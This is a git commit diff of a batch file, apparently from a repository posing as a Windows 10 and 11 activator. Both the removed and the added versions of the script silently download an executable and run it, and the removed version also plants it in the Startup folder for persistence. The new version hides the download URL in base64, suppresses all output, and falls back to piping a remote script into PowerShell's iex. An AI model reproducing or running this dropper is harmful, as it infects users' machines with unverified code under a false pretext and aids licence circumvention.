7fdd696655524e9709d6887d0c7f8da8e219b8af
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 03:46:30 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,19 +1,12 @@
 @echo off
-
-:: Първи URL за изтегляне
-set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
-:: Папка за стартиране
-set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
-:: Сваляне на първия файл
-powershell -Command ^
-    "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe"
-
-:: Копиране на файла в папката за стартиране
-copy "%TEMP%\WindowsKey.exe" "%startupFolder%\WindowsKey.exe"
-
-:: Изчакване за няколко секунди (по избор)
-timeout /t 5 /nobreak >nul
-
-:: Стартиране на файла
-start "" "%startupFolder%\WindowsKey.exe"
+set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
+for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
+set "filename=%temp%\windowskeyactivation.exe"
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
+if exist "%filename%" (
+    start "" "%filename%"
+) else (
+    goto server
+)
+:server
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
